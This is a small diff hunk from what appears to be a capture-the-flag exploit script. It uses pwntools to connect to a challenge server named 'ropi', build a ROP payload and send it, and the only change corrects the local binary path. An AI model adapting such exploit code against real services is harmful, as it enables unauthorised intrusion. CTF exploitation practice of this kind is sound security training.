@@ -31,7 +31,7 @@ payload3    += p32(main)
 
 # Start Pwnage
 p = remote('ropi.vuln.icec.tf',6500) # Remote
-#p = process('ropi') # local
+#p = process('./ropi') # local
 
 p.recv()
 p.sendline(payload)
